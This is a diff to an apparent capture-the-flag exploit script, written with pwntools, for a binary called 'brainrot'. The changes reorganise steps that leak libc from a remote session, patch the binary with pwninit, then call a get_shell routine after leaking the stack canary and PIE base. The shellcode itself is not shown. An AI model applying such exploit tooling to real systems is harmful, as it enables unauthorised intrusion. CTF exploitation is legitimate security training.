@@ -91,7 +91,7 @@ def get_shell(binary_path, libc_path):
     elf = context.binary = ELF(binary_path)
     libc = ELF(libc_path, checksec=False)
 
-    p = start(elf)
+    p = start(elf.path)
 
     # +========================================================+
     # | Leak canary and pie base from the stack                |
@@ -183,15 +183,25 @@ def get_shell(binary_path, libc_path):
 
 
 if __name__ == "__main__":
-    libc_path = get_libc_leak("./brainrot")  # Must use remote session to work
+    libc = "./libc.so.6"
+    binary = "./brainrot"
+    binary_patched = "./brainrot_patched"
 
-    from shutil import copy
-    copy(libc_path, "./libc.so.6")
+    if not os.path.exists(binary_patched):
+        if args.LOCAL:
+            raise Exception("Leaking LIBC Cannot be run in local environment")
 
-    # Patch the binary
-    _, stderr = subprocess.Popen(
-        ["pwninit", "--no-template", "--bin", "./brainrot", "--libc", "./libc.so.6"]).communicate()
+        libc_path = get_libc_leak(binary)  # Must use remote session to work
+
+        from shutil import copy
+        copy(libc_path, libc)
+
+        # Patch the binary
+        _, stderr = subprocess.Popen(["pwninit", "--no-template", "--bin", binary, "--libc",
+                                      libc]).communicate()
+
+        if stderr:
+            raise Exception(stderr)
 
     # Run again with patched binary
-    if not stderr:
-        get_shell("./brainrot_patched", "./libc.so.6")
+    get_shell(binary_patched, libc)
